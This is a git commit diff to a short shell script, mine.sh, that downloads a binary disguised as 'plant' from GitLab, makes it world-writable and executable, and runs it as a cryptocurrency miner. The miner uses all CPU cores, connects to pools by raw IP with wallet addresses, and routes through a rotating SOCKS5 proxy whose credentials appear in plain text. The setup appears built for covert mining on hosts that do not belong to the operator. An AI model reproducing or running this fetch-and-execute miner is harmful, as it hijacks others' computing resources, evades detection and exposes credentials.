26afba0234d85e46747353106607b548aa29ce69
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 05:09:08 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://gitlab.com/richardkevin320/donlod/-/raw/main/plant
 chmod 777 plant
-./plant -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Tet -p c=OK -t $(nproc --all) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+./plant -a yespowerTIDE -o stratum+tcp://51.161.117.115:17059 -u TGYVQ8n7a46eyfQtwddy2eFdjLUP5mYLzv.Wew -p c=Tet -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
